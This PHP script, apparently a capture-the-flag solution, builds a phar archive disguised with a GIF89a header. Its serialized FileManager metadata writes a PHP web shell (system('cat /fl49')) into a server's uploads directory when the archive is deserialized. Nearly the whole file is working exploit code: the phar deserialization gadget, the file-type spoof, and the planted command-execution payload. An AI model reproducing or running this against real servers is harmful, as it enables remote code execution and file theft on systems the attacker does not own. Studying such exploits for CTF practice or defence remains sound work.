<?php
class FileManager {

    public $name = '';
    public $content = '';
    public $mode = '';

    function __construct($m, $f, $c=null) {
        $this->mode = $m;
        $this->name = $f;
        $this->content = $c;
    }
    /*
    function __destruct() {
        if( $this->mode === "delete" )
            $this->delFile();
        if( $this->mode === "upload" )
            file_put_contents($this->name, $this->content);
    }

    function getFile() {
        if( $this->mode === "read" )
            return file_get_contents($this->name);
        else
            return "Bye";
    }

    function modifyFile() {
        if( $this->mode === "modify" )
            file_put_contents($this->name, $this->content);
    }

    function delFile() {
        unlink($this->name);
    }*/

}

    // read 008.gif
    // $filename = "008.gif";
    // $contents = fread(fopen($filename, "rb"), filesize($filename));

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    # function __construct($m, $f, $c=null) {
    $o = new FileManager('upload','/var/www/html/uploads/WOA.php',"<?php\nsystem('cat /fl49');\n?>");
    // $o = new FileManager('upload','/var/www/html/uploads/WOA.php',"M30W~");
    $phar->setMetadata($o); 
    $phar->addFromString("OAO.oAo","OAO");
    $phar->stopBuffering();
?>
